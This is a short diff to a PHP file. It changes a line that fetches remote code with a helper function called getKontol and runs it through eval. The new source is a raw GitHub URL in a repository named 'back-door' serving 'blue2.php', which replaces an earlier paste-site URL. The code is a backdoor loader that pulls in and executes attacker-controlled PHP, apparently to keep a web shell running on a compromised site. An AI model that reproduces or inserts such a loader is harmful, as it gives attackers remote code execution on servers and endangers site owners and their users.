@@ -18,6 +18,6 @@ function getKontol($url) {
     }
 }
 
-eval("?>" . getKontol("https://pastefy.app/rb5AnDXR/raw"));
+eval("?>" . getKontol("https://raw.githubusercontent.com/shell2306/back-door/refs/heads/main/blue2.php"));
 
 ?>
